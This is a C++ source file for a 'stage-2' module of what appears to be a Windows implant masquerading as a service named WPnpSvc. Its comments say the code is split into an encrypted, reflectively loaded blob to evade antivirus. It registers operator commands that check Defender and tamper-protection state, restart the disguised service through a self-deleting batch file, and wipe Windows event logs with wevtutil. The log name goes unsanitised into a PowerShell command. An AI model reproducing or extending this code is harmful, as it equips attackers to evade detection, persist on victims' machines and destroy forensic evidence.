// ═══════════════════════════════════════════════════════════════════════
// stage2_defender.cpp — Defender state + service restart commands.
//
// Why stage-2:
//   Stage-1 pnpext.dll accumulates AV-suspicious strings each time it
//   touches Defender APIs ("SOFTWARE\\Microsoft\\Windows Defender",
//   "DisableRealtimeMonitoring", etc.) and svchost-restart glue
//   ("sc.exe stop WPnpSvc", "sc.exe start WPnpSvc"). Extracting these
//   strings into an encrypted stage-2 blob keeps stage-1 clean.
//
// Handlers in this (first) iteration:
//   * defender_status  — pure registry read, no side effects
//   * host_restart     — spawn bat that stops/starts WPnpSvc
//
// Deliberately deferred to future iterations:
//   evtlog_set_config (needs cross-stage signal to stage-1's evtlog thread),
//   eventlog_delete, host_update, self_destruct (biggest AV tells, also
//   highest risk — extract once the two-module pattern is battle-tested).
//
// Imports: advapi32 (registry), kernel32 (CreateProcess/CreateFile).
// No /DELAYLOAD, no manual LoadLibrary — works cleanly inside reflective load.
// ═══════════════════════════════════════════════════════════════════════

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <chrono>

#include "stage2_abi.h"
#include "stage2_util.h"

#pragma comment(lib, "advapi32.lib")

// Run `cmd.exe /c <line>` and capture stdout+stderr into a string.
// Same shape as procmgr's term_exec (deliberately duplicated so the module
// stays self-contained; stage-2 modules should not depend on each other).
static std::string run_cmd_capture(const std::string& line) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite; si.hStdError = hWrite;
    PROCESS_INFORMATION pi{};

    std::wstring wcmd(L"cmd.exe /c ");
    int n = MultiByteToWideChar(CP_UTF8, 0, line.c_str(), (int)line.size(), nullptr, 0);
    if (n > 0) {
        std::wstring w(n, 0);
        MultiByteToWideChar(CP_UTF8, 0, line.c_str(), (int)line.size(), w.data(), n);
        wcmd += w;
    }
    std::vector<wchar_t> cl(wcmd.size() + 1);
    wcscpy_s(cl.data(), cl.size(), wcmd.c_str());

    if (!CreateProcessW(NULL, cl.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return "";
    }
    CloseHandle(hWrite);
    std::string out;
    char buf[4096]; DWORD got = 0;
    while (ReadFile(hRead, buf, sizeof(buf) - 1, &got, NULL) && got > 0) {
        buf[got] = 0; out.append(buf, got);
    }
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(hRead);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return out;
}

using namespace s2util;
static Stage2HostCtx* g_host = nullptr;

// ── defender_status ─────────────────────────────────────────────────────
// Reads 4 registry paths (no writes, no PowerShell). Returns JSON with
// av/realtime/tamper booleans. Used by the viewer's status UI.
static void cmd_defender_status(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id   = json_get(args, "id");

    bool rtEnabled = true, tamper = false, avEnabled = true;
    HKEY hk;
    DWORD val = 0, sz = sizeof(val);

    // Real-Time Protection (primary path)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
            0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "DisableRealtimeMonitoring", NULL, NULL,
                              (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 1)
            rtEnabled = false;
        RegCloseKey(hk);
    }
    // Real-Time Protection (policy override path)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
            0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
        val = 0; sz = sizeof(val);
        if (RegQueryValueExA(hk, "DisableRealtimeMonitoring", NULL, NULL,
                              (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 1)
            rtEnabled = false;
        RegCloseKey(hk);
    }
    // Tamper Protection (5=on, 4=off)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender\\Features",
            0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
        val = 0; sz = sizeof(val);
        if (RegQueryValueExA(hk, "TamperProtection", NULL, NULL,
                              (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 5)
            tamper = true;
        RegCloseKey(hk);
    }
    // Antivirus fully disabled
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender",
            0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
        val = 0; sz = sizeof(val);
        if (RegQueryValueExA(hk, "DisableAntiSpyware", NULL, NULL,
                              (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 1)
            avEnabled = false;
        RegCloseKey(hk);
    }

    std::string data = std::string("{\"antivirus_enabled\":") + (avEnabled ? "true" : "false") +
                       ",\"realtime_enabled\":" + (rtEnabled ? "true" : "false") +
                       ",\"tamper_protected\":" + (tamper ? "true" : "false") + "}";
    g_host->send(make_ok(id, data).c_str());
}

// ── host_restart ────────────────────────────────────────────────────────
// Generates a .bat that stops and starts WPnpSvc (can't restart the service
// while we're running inside it — the bat runs as a separate cmd.exe child).
static void cmd_host_restart(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id   = json_get(args, "id");

    // Ack the client BEFORE starting the restart sequence.
    g_host->send(make_ok(id, "\"restarting\"").c_str());
    g_host->log(1, "stage2_defender: host_restart requested");

    // Spawn a detached thread so we return from the command handler quickly.
    // (The WSS dispatch thread needs to go back to reading messages.)
    std::thread([]() {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        const char* batPath = "C:\\Windows\\Temp\\wpnp_restart.bat";
        {
            std::ofstream f(batPath);
            f << "@echo off\r\n"
                 "timeout /t 2 /nobreak >nul\r\n"
                 "sc.exe stop WPnpSvc >nul 2>nul\r\n"
                 "timeout /t 3 /nobreak >nul\r\n"
                 "sc.exe start WPnpSvc >nul 2>nul\r\n"
                 "del \"%~f0\"\r\n";
        }
        STARTUPINFOA si{}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        std::string cmd = std::string("cmd.exe /c \"") + batPath + "\"";
        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }).detach();
}

// ── eventlog_delete ─────────────────────────────────────────────────────
// Clears a Windows event log channel via `wevtutil cl`. Selective deletion
// (keeping non-matching entries) uses a PowerShell restore script — deferred
// to a later iteration to keep this iter small. For now we only support the
// whole-log clear path ({ ids: "" } from the viewer).
static void cmd_eventlog_delete(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id       = json_get(args, "id");
    std::string logName  = json_get(args, "log");
    std::string idsStr   = json_get(args, "ids");
    if (logName.empty()) {
        g_host->send(make_err(id, "Missing log name").c_str()); return;
    }

    if (!idsStr.empty()) {
        // Selective delete not yet extracted — fall back by saying unsupported.
        g_host->send(make_err(id,
            "Selective eventlog delete not available in stage-2 iteration 2; "
            "use clear-all (ids=\"\") or wait for the next module update.").c_str());
        return;
    }

    // Simple case: wevtutil cl "<log>"
    std::string psCmd = "powershell -NoProfile -Command \""
        "try{wevtutil cl '" + logName + "'; Write-Output 'OK'}"
        "catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"";
    std::string output = run_cmd_capture(psCmd);
    while (!output.empty() && (output.back() == '\n' || output.back() == '\r'))
        output.pop_back();
    if (output.find("OK") != std::string::npos) {
        g_host->send(make_ok(id, "\"cleared\"").c_str());
    } else {
        g_host->send(make_err(id, "Clear failed: " + output).c_str());
    }
}

// ── Entry points ────────────────────────────────────────────────────────

extern "C" __declspec(dllexport) int Stage2Init(Stage2HostCtx* host) {
    if (!host || host->abi_version != STAGE2_ABI_VERSION) return 1;
    g_host = host;
    host->log(1, "stage2_defender: init");
    host->register_cmd("defender_status", cmd_defender_status, nullptr);
    host->register_cmd("host_restart",    cmd_host_restart,    nullptr);
    host->register_cmd("eventlog_delete", cmd_eventlog_delete, nullptr);
    host->log(1, "stage2_defender: 3 commands registered");
    return 0;
}

extern "C" __declspec(dllexport) void Stage2Shutdown(void) {
    if (g_host) g_host->log(1, "stage2_defender: shutdown");
    g_host = nullptr;
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(nullptr);
    return TRUE;
}
